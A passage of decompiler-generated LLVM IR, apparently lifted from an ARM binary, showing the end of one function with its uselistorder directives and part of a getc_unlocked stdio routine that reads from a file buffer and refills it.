  %v1_17c68.pre = phi i32 [ %v2_177d4, %.thread105 ], [ %v1_17c58, %dec_label_pc_17c3c ], [ %v1_17c68.pre.pre, %dec_label_pc_17bd4 ]
  %v2_17c5c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_17c5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c60

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c60, %dec_label_pc_17c5c
  %v0_17c60 = phi i32 [ %v2_17c5c, %dec_label_pc_17c5c ], [ %v4_17c60, %dec_label_pc_17c60 ]
  %stack_var_-188.0 = phi i32 [ %v3_1770c, %dec_label_pc_17c5c ], [ %v2_17c6c, %dec_label_pc_17c60 ]
  %v1_17c60 = inttoptr i32 %v0_17c60 to i32*
  %v2_17c60 = load i32, i32* %v1_17c60, align 4
  store i32 %v2_17c60, i32* %r3.global-to-local, align 4
  %v4_17c60 = add i32 %v0_17c60, 12
  store i32 %v4_17c60, i32* %r2.global-to-local, align 4
  %v3_17c68 = icmp ult i32 %v4_17c60, %v1_17c68.pre
  %v2_17c6c = sub i32 %stack_var_-188.0, %v2_17c60
  store i32 %v2_17c6c, i32* %ip.global-to-local, align 4
  br i1 %v3_17c68, label %dec_label_pc_17c60, label %dec_label_pc_17c78

dec_label_pc_17c78:                               ; preds = %dec_label_pc_17c60
  %v3_17c78 = load i8, i8* %stack_var_-50, align 1
  %v4_17c78 = sext i8 %v3_17c78 to i32
  store i32 %v4_17c78, i32* %r3.global-to-local, align 4
  store i32 %v4_17c78, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17c7c = icmp slt i8 %v3_17c78, 0
  store i1 %v1_17c7c, i1* %cpsr_n.global-to-local, align 1
  %v2_17c7c = icmp eq i8 %v3_17c78, 0
  store i1 %v2_17c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c7c, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_17c78
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_17c78, %bb225
  %v1_17cc8 = phi i32 [ %v4_17c78, %dec_label_pc_17c78 ], [ 1, %bb225 ]
  %v2_17c84 = sub i32 %v2_17c6c, %v1_17cc8
  store i32 %v2_17c84, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_17c8c = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_17c8c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17c90 = icmp slt i32 %v2_17c84, 0
  store i1 %v1_17c90, i1* %cpsr_n.global-to-local, align 1
  %v2_17c90 = icmp eq i32 %v2_17c84, 0
  store i1 %v2_17c90, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_17c84, 1
  br i1 %tmp227, label %dec_label_pc_17cf0, label %dec_label_pc_17ca4

dec_label_pc_17ca4:                               ; preds = %bb226
  %v0_17ca4 = load i32, i32* %fp.global-to-local, align 4
  %v1_17ca4 = add i32 %v0_17ca4, 12
  %v2_17ca4 = inttoptr i32 %v1_17ca4 to i32*
  %v3_17ca4 = load i32, i32* %v2_17ca4, align 4
  store i32 %v3_17ca4, i32* %r3.global-to-local, align 4
  %v1_17ca8 = and i32 %v3_17ca4, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17ca8 = icmp eq i32 %v1_17ca8, 0
  store i1 %v2_17ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ca8, label %dec_label_pc_17cc0, label %dec_label_pc_17cb0

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17ca4
  store i32 ptrtoint (i32* @global_var_1dbb3.1094 to i32), i32* %r3.global-to-local, align 4
  %v1_17cb4 = add i32 %v1_17c68.pre, 12
  store i32 %v1_17cb4, i32* %r5.global-to-local, align 4
  %v1_17cb8 = inttoptr i32 %v1_17c68.pre to i32*
  store i32 160, i32* %v1_17cb8, align 4
  %v3_17cb8 = add i32 %v1_17c68.pre, 4
  %v4_17cb8 = inttoptr i32 %v3_17cb8 to i32*
  %v5_17cb8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17cb8, i32* %v4_17cb8, align 4
  %v6_17cb8 = add i32 %v1_17c68.pre, 8
  %v7_17cb8 = inttoptr i32 %v6_17cb8 to i32*
  %v8_17cb8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_17cb8, i32* %v7_17cb8, align 4
  br label %dec_label_pc_17cf4

dec_label_pc_17cc0:                               ; preds = %dec_label_pc_17ca4
  %v1_17cc0 = add i32 %v0_17ca4, 16
  %v2_17cc0 = inttoptr i32 %v1_17cc0 to i32*
  %v3_17cc0 = load i32, i32* %v2_17cc0, align 4
  store i32 %v3_17cc0, i32* %r3.global-to-local, align 4
  %v1_17cc4 = add i32 %v3_17cc0, -48
  %v3_17cc4 = sub i32 47, %v3_17cc0
  %v4_17cc4 = and i32 %v3_17cc4, %v3_17cc0
  %v5_17cc4 = icmp slt i32 %v4_17cc4, 0
  store i1 %v5_17cc4, i1* %cpsr_v.global-to-local, align 1
  %v6_17cc4 = icmp slt i32 %v1_17cc4, 0
  store i1 %v6_17cc4, i1* %cpsr_n.global-to-local, align 1
  %v7_17cc4 = icmp eq i32 %v3_17cc0, 48
  store i1 %v7_17cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cc4, label %dec_label_pc_17cd4, label %bb228

bb228:                                            ; preds = %dec_label_pc_17cc0
  store i32 %v2_17c6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cf0

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc0
  %v3_17cd4 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_17c68.pre, i32* %r5.global-to-local, align 4
  %v2_17cdc = add i32 %v3_17cd4, %v2_17c84
  store i32 %v2_17cdc, i32* %r3.global-to-local, align 4
  store i32 %v2_17cdc, i32* %stack_var_-168, align 4
  br label %dec_label_pc_17cf4

dec_label_pc_17ce8:                               ; preds = %dec_label_pc_17cfc
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17cf0:                               ; preds = %bb228, %bb226
  store i32 %v1_17c68.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17cf4

dec_label_pc_17cf4:                               ; preds = %dec_label_pc_17cd4, %dec_label_pc_17cb0, %dec_label_pc_17cf0
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_176e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17d24, %dec_label_pc_17cf4
  %v0_17cfc = phi i32 [ %v1_17d1c, %dec_label_pc_17d24 ], [ %v2_176e8, %dec_label_pc_17cf4 ]
  %v1_17cfc = inttoptr i32 %v0_17cfc to i32*
  %v2_17cfc = load i32, i32* %v1_17cfc, align 4
  store i32 %v2_17cfc, i32* %r1.global-to-local, align 4
  %v3_17cfc = add i32 %v0_17cfc, 4
  %v4_17cfc = inttoptr i32 %v3_17cfc to i32*
  %v5_17cfc = load i32, i32* %v4_17cfc, align 4
  store i32 %v5_17cfc, i32* %r2.global-to-local, align 4
  %v6_17cfc = add i32 %v0_17cfc, 8
  %v7_17cfc = inttoptr i32 %v6_17cfc to i32*
  %v8_17cfc = load i32, i32* %v7_17cfc, align 4
  store i32 %v8_17cfc, i32* %r3.global-to-local, align 4
  %v2_17d00 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_17d00, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 97552, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_17d10 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d10 = add i32 %v0_17d10, 4
  %v2_17d10 = inttoptr i32 %v1_17d10 to i32*
  %v3_17d10 = load i32, i32* %v2_17d10, align 4
  store i32 %v3_17d10, i32* %r3.global-to-local, align 4
  %v0_17d14 = load i32, i32* %r0.global-to-local, align 4
  %v2_17d14 = sub i32 %v0_17d14, %v3_17d10
  %v4_17d14 = xor i32 %v0_17d14, %v3_17d10
  %v5_17d14 = xor i32 %v2_17d14, %v0_17d14
  %v6_17d14 = and i32 %v5_17d14, %v4_17d14
  %v7_17d14 = icmp slt i32 %v6_17d14, 0
  store i1 %v7_17d14, i1* %cpsr_v.global-to-local, align 1
  %v8_17d14 = icmp slt i32 %v2_17d14, 0
  store i1 %v8_17d14, i1* %cpsr_n.global-to-local, align 1
  %v9_17d14 = icmp eq i32 %v0_17d14, %v3_17d10
  store i1 %v9_17d14, i1* %cpsr_z.global-to-local, align 1
  %v0_17d18 = load i32, i32* %r6.global-to-local, align 4
  %v2_17d18 = add i32 %v0_17d18, %v0_17d14
  store i32 %v2_17d18, i32* %r6.global-to-local, align 4
  %v1_17d1c = add i32 %v0_17d10, 12
  store i32 %v1_17d1c, i32* %r4.global-to-local, align 4
  br i1 %v9_17d14, label %dec_label_pc_17d24, label %dec_label_pc_17ce8

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17cfc
  %v1_17d24 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d24 = sub i32 %v1_17d1c, %v1_17d24
  %v3_17d24 = icmp ult i32 %v1_17d1c, %v1_17d24
  %v4_17d24 = xor i32 %v1_17d24, %v1_17d1c
  %v5_17d24 = xor i32 %v2_17d24, %v1_17d1c
  %v6_17d24 = and i32 %v5_17d24, %v4_17d24
  %v7_17d24 = icmp slt i32 %v6_17d24, 0
  store i1 %v7_17d24, i1* %cpsr_v.global-to-local, align 1
  %v8_17d24 = icmp slt i32 %v2_17d24, 0
  store i1 %v8_17d24, i1* %cpsr_n.global-to-local, align 1
  %v9_17d24 = icmp eq i32 %v1_17d1c, %v1_17d24
  store i1 %v9_17d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17d24, label %dec_label_pc_17cfc, label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %dec_label_pc_17d24, %dec_label_pc_17ce8
  %v0_17d2c = phi i32 [ -1, %dec_label_pc_17ce8 ], [ %v2_17d18, %dec_label_pc_17d24 ]
  store i32 %v0_17d2c, i32* %r0.global-to-local, align 4
  %v8_17d38 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_17d38, i32* @r6, align 4
  store i32 %v6_176d4, i32* @r7, align 4
  store i32 %v9_176d4, i32* @r8, align 4
  store i32 %v12_176d4, i32* @sb, align 4
  store i32 %v15_176d4, i32* @sl, align 4
  store i32 %v18_176d4, i32* @fp, align 4
  ret i32 %v0_17d2c

; uselistorder directives
  uselistorder i32 %v0_17d2c, { 1, 0 }
  uselistorder i32 %v2_17d24, { 1, 0 }
  uselistorder i32 %v1_17d24, { 2, 0, 1, 3 }
  uselistorder i32 %v1_17d1c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_17d14, { 1, 0 }
  uselistorder i32 %v0_17d14, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_17d10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17cfc, { 2, 1, 0 }
  uselistorder i32 %v3_17cc0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_17c6c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_17c60, { 1, 2, 0 }
  uselistorder i32 %v0_17c60, { 1, 0 }
  uselistorder i32 %v1_17c68.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_17c20, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_17c1c, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_17be0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17bd4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_17bb0, { 1, 0 }
  uselistorder i32 %v1_17bb0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17bac, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_17ba4, { 1, 0 }
  uselistorder i32 %v0_17b9c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_17b84, { 1, 0 }
  uselistorder i32 %v1_17b60, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17b60, { 1, 0, 2 }
  uselistorder i32 %v1_17b3c, { 0, 2, 1 }
  uselistorder i32 %v0_17b38, { 3, 0, 1, 2 }
  uselistorder i1 %v2_17b1c, { 2, 1, 0 }
  uselistorder i32 %v2_17a74, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_17a64, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_17b08, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_17a10, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_179f8, { 1, 0 }
  uselistorder i32 %v2_179f0, { 1, 2, 0 }
  uselistorder i32 %v1_179e4, { 1, 0 }
  uselistorder i32 %v0_179e4, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_179dc, { 1, 0, 2 }
  uselistorder i32 %v0_179d4, { 3, 0, 1, 2 }
  uselistorder i1 %v3_179b8, { 1, 0 }
  uselistorder i32 %v2_179b8, { 1, 0 }
  uselistorder i32 %v2_179b4, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_179a0, { 1, 0 }
  uselistorder i32 %v1_179a4, { 2, 1, 0 }
  uselistorder i1 %v2_17994, { 1, 0 }
  uselistorder i32 %v0_17990, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_17978, { 1, 0 }
  uselistorder i32 %v1_1796c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_17924, { 1, 2, 0 }
  uselistorder i32 %v2_17920, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17920, { 1, 0, 2 }
  uselistorder i1 %v2_1790c, { 1, 0 }
  uselistorder i32 %v0_17904, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_17914, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_178f4, { 1, 0 }
  uselistorder i32 %v0_178e4, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_178dc, { 1, 0 }
  uselistorder i1 %v5_178dc, { 1, 0 }
  uselistorder i32 %v0_178d8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_178cc, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_178c8, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_1787c, { 1, 0 }
  uselistorder i32 %v3_1787c, { 1, 0 }
  uselistorder i32 %v0_177b0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_176e8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_176e4, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 1, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 52, 44, 45, 53, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 17, 15, 16, 18, 9, 10, 19, 11, 12, 13, 20, 14, 1, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6, 7 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 17, { 7, 0, 9, 10, 1, 11, 12, 2, 13, 3, 14, 4, 15, 5, 16, 24, 8, 17, 18, 19, 6, 20, 21, 22, 23 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6, 7 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_17cf4, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_17c5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17bd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17bac, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_17b84, { 1, 0 }
  uselistorder label %dec_label_pc_17b60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b14, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17a38, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_17a28, { 1, 0 }
  uselistorder label %dec_label_pc_17a1c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_17944, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_17d3c = load i32, i32* @r4, align 4
  store i32 %v3_17d3c, i32* %stack_var_-8, align 4
  %v0_17d40 = load i32, i32* @r0, align 4
  %v1_17d40 = add i32 %v0_17d40, 16
  %v2_17d40 = inttoptr i32 %v1_17d40 to i32*
  %v3_17d40 = load i32, i32* %v2_17d40, align 4
  store i32 %v3_17d40, i32* %r2.global-to-local, align 4
  %v1_17d44 = add i32 %v0_17d40, 24
  %v2_17d44 = inttoptr i32 %v1_17d44 to i32*
  %v3_17d44 = load i32, i32* %v2_17d44, align 4
  %v3_17d48 = icmp ult i32 %v3_17d40, %v3_17d44
  store i32 %v0_17d40, i32* @r4, align 4
  br i1 %v3_17d48, label %bb, label %dec_label_pc_17d60

bb:                                               ; preds = %entry
  %v2_17d50 = inttoptr i32 %v3_17d40 to i8*
  %v3_17d50 = load i8, i8* %v2_17d50, align 1
  %v4_17d50 = zext i8 %v3_17d50 to i32
  store i32 %v4_17d50, i32* %r0.global-to-local, align 4
  %v6_17d50 = add i32 %v3_17d40, 1
  store i32 %v6_17d50, i32* %r2.global-to-local, align 4
  store i32 %v6_17d50, i32* %v2_17d40, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17d60:                               ; preds = %entry
  %v1_17d60 = inttoptr i32 %v0_17d40 to i8*
  %v2_17d60 = load i8, i8* %v1_17d60, align 1
  %v3_17d60 = zext i8 %v2_17d60 to i32
  %v1_17d64 = and i32 %v3_17d60, 131
  %tmp22 = icmp ugt i32 %v1_17d64, 128
  br i1 %tmp22, label %dec_label_pc_17d80, label %dec_label_pc_17d70

dec_label_pc_17d70:                               ; preds = %dec_label_pc_17d60
  store i32 128, i32* @r1, align 4
  %v0_17d74 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17d74, i32* %r0.global-to-local, align 4
  %v2_17d78 = icmp eq i32 %v0_17d74, 0
  br i1 %v2_17d78, label %dec_label_pc_17d70.dec_label_pc_17d80_crit_edge, label %dec_label_pc_17e5c

dec_label_pc_17d70.dec_label_pc_17d80_crit_edge:  ; preds = %dec_label_pc_17d70
  %v0_17d80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17d70.dec_label_pc_17d80_crit_edge, %dec_label_pc_17d60
  %v2_17dcc = phi i32 [ %v0_17d80.pre, %dec_label_pc_17d70.dec_label_pc_17d80_crit_edge ], [ %v0_17d40, %dec_label_pc_17d60 ]
  %v1_17d80 = inttoptr i32 %v2_17dcc to i8*
  %v2_17d80 = load i8, i8* %v1_17d80, align 1
  %v3_17d80 = zext i8 %v2_17d80 to i32
  store i32 %v3_17d80, i32* %r2.global-to-local, align 4
  %v1_17d84 = add i32 %v2_17dcc, 1
  %v2_17d84 = inttoptr i32 %v1_17d84 to i8*
  %v3_17d84 = load i8, i8* %v2_17d84, align 1
  %v4_17d84 = zext i8 %v3_17d84 to i32
  %v4_17d88 = mul nuw nsw i32 %v4_17d84, 256
  %v5_17d88 = or i32 %v4_17d88, %v3_17d80
  store i32 %v5_17d88, i32* %r2.global-to-local, align 4
  %v1_17d8c = and i32 %v3_17d80, 2
  %v2_17d8c = icmp eq i32 %v1_17d8c, 0
  br i1 %v2_17d8c, label %dec_label_pc_17dbc, label %dec_label_pc_17d94

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17d80
  %tmp23 = urem i8 %v2_17d80, 2
  %v1_17d94 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_17d94
  %v4_17d98 = and i32 %tmp18, 4
  %v5_17d98 = add i32 %v4_17d98, %v2_17dcc
  %v1_17d9c = add i32 %v5_17d98, 36
  %v2_17d9c = inttoptr i32 %v1_17d9c to i8*
  %v3_17d9c = load i8, i8* %v2_17d9c, align 1
  %v4_17d9c = zext i8 %v3_17d9c to i32
  %v1_17da0 = add nsw i32 %v5_17d88, -1
  store i32 %v1_17da0, i32* %r2.global-to-local, align 4
  %v3_17da4 = sdiv i32 %v1_17da0, 256
  store i32 %v3_17da4, i32* %r1.global-to-local, align 4
  store i32 %v4_17d9c, i32* %r0.global-to-local, align 4
  %v2_17db0 = add i32 %v2_17dcc, 40
  %v3_17db0 = inttoptr i32 %v2_17db0 to i32*
  store i32 0, i32* %v3_17db0, align 4
  %v0_17db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17db4 = trunc i32 %v0_17db4 to i8
  %v2_17db4 = load i32, i32* @r4, align 4
  %v3_17db4 = add i32 %v2_17db4, 1
  %v4_17db4 = inttoptr i32 %v3_17db4 to i8*
  store i8 %v1_17db4, i8* %v4_17db4, align 1
  br label %dec_label_pc_17df0

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17d80
  %v1_17dbc = add i32 %v2_17dcc, 16
  store i32 %v1_17dbc, i32* %r1.global-to-local, align 4
  %v1_17dc0 = inttoptr i32 %v1_17dbc to i32*
  %v2_17dc0 = load i32, i32* %v1_17dc0, align 4
  store i32 %v2_17dc0, i32* %r1.global-to-local, align 4
  %v3_17dc0 = add i32 %v2_17dcc, 20
  %v4_17dc0 = inttoptr i32 %v3_17dc0 to i32*
  %v5_17dc0 = load i32, i32* %v4_17dc0, align 4
  %v9_17dc4 = icmp eq i32 %v5_17dc0, %v2_17dc0
  br i1 %v9_17dc4, label %dec_label_pc_17dd4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17dbc
  %v2_17dc8 = inttoptr i32 %v2_17dc0 to i8*
  %v3_17dc8 = load i8, i8* %v2_17dc8, align 1
  %v4_17dc8 = zext i8 %v3_17dc8 to i32
  store i32 %v4_17dc8, i32* %r0.global-to-local, align 4
  %v6_17dc8 = add i32 %v2_17dc0, 1
  store i32 %v6_17dc8, i32* %r1.global-to-local, align 4
  store i32 %v6_17dc8, i32* %v1_17dc0, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17dbc
  %v1_17dd4 = add i32 %v2_17dcc, 4
  %v2_17dd4 = inttoptr i32 %v1_17dd4 to i32*
  %v3_17dd4 = load i32, i32* %v2_17dd4, align 4
  %v4_17ddc = icmp eq i32 %v3_17dd4, -2
  br i1 %v4_17ddc, label %dec_label_pc_17de0, label %dec_label_pc_17df8

dec_label_pc_17de0:                               ; preds = %dec_label_pc_17dd4
  %v1_17de0 = or i32 %v5_17d88, 4
  store i32 %v1_17de0, i32* %r2.global-to-local, align 4
  store i8 %v3_17d84, i8* %v2_17d84, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17df0

dec_label_pc_17df0:                               ; preds = %dec_label_pc_17d94, %dec_label_pc_17de0
  %v0_17df0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17df0 = trunc i32 %v0_17df0 to i8
  %v2_17df0 = load i32, i32* @r4, align 4
  %v3_17df0 = inttoptr i32 %v2_17df0 to i8*
  store i8 %v1_17df0, i8* %v3_17df0, align 1
  br label %dec_label_pc_17e60

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17dd4
  %v1_17df8 = and i32 %v4_17d88, 768
  %v2_17df8 = icmp eq i32 %v1_17df8, 0
  br i1 %v2_17df8, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_17df8
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17df8, %bb19
  store i32 97796, i32* @lr, align 4
  %v1_17e00 = xor i1 %v2_17df8, true
  call void @__pseudo_cond_branch(i1 %v1_17e00, i32 ptrtoint (i32* @global_var_145c8.1098 to i32))
  %v0_17e04 = load i32, i32* @r4, align 4
  %v1_17e04 = add i32 %v0_17e04, 8
  store i32 %v1_17e04, i32* %r2.global-to-local, align 4
  %v1_17e08 = inttoptr i32 %v1_17e04 to i32*
  %v2_17e08 = load i32, i32* %v1_17e08, align 4
  store i32 %v2_17e08, i32* %r2.global-to-local, align 4
  %v3_17e08 = add i32 %v0_17e04, 12
  %v4_17e08 = inttoptr i32 %v3_17e08 to i32*
  %v5_17e08 = load i32, i32* %v4_17e08, align 4
  %v9_17e0c = icmp eq i32 %v5_17e08, %v2_17e08
  br i1 %v9_17e0c, label %dec_label_pc_17e40, label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %bb20
  %v2_17e14 = add i32 %v0_17e04, 24
  %v3_17e14 = inttoptr i32 %v2_17e14 to i32*
  store i32 %v2_17e08, i32* %v3_17e14, align 4
  %v0_17e18 = load i32, i32* @r4, align 4
  store i32 %v0_17e18, i32* %r0.global-to-local, align 4
  %v2_17e1c = call i32 @__stdio_rfill(i32 %v0_17e18)
  store i32 %v2_17e1c, i32* %r0.global-to-local, align 4
  %v2_17e20 = icmp eq i32 %v2_17e1c, 0
  br i1 %v2_17e20, label %dec_label_pc_17e5c, label %dec_label_pc_17e28

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17e14
